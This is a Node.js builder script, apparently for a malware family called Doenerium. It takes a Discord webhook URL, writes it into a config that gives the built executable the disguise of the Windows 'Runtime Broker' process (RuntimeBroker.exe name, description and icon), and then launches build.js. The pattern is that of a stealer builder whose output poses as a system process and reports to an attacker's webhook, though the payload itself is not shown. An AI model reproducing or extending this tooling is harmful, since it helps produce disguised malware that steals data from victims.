const readline = require('readline');
const chalk = require('chalk');
const { exec } = require('child_process');
const fs = require('fs');



const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function displayHeader() {
  console.log(`
${chalk.yellow('')}
${chalk.yellow('')}
${chalk.yellow('	██████╗  ██████╗ ███████╗███╗   ██╗███████╗██████╗ ██╗██╗   ██╗███╗   ███╗')}
${chalk.yellow('	██╔══██╗██╔═══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗██║██║   ██║████╗ ████║')}
${chalk.yellow('	██║  ██║██║   ██║█████╗  ██╔██╗ ██║█████╗  ██████╔╝██║██║   ██║██╔████╔██║')}
${chalk.yellow('	██║  ██║██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██║██║   ██║██║╚██╔╝██║')}
${chalk.yellow('	██████╔╝╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║╚██████╔╝██║ ╚═╝ ██║')}
${chalk.yellow('	╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝')}
                                       ${chalk.yellow('					   Builder')}
`);
}

function clearConsole() {
  // Imprime 100 sauts de ligne pour simuler le nettoyage de la console
  console.log('\n'.repeat(25));
}

function updateConfigFile(webhookURL) {
  console.log(chalk.blue('\n	[+] Updating the configuration file...'));

  const configData = `module.exports = () => {
    return {
        webhook_url: "${webhookURL}",
        icon: './default.ico',
        properties: {
            FileDescription: 'Runtime Broker',
            ProductName: 'Runtime_Broker',
            LegalCopyright: 'Runtime Broker ©️ 2023',
            OriginalFilename: 'RuntimeBroker.exe'
        }
    }
  }`;

  fs.writeFile('config.js', configData, (err) => {
    if (err) {
      console.error('	Error writing to config.js:', err);
    } else {
      console.log(chalk.green('	 [+] Done !'));
      console.log('	Configuration file updated with Discord webhook.');
      console.log('	Launching build.js...');
clearConsole();
      // Exécute le script build.js
      const child = exec('node build.js');

      child.stdout.on('data', (data) => {
        console.log(`	stdout: ${data}`);
      });

      child.stderr.on('data', (data) => {
        console.error(`	stderr: ${data}`);
      });

      child.on('close', (code) => {
        console.log(`	child process exited with code ${code}`);
      });
    }
  });
}

displayHeader();

rl.question('	[+] Please enter the Discord webhook: (press right click to paste) ', (webhookURL) => {
  rl.close();
  updateConfigFile(webhookURL);
});
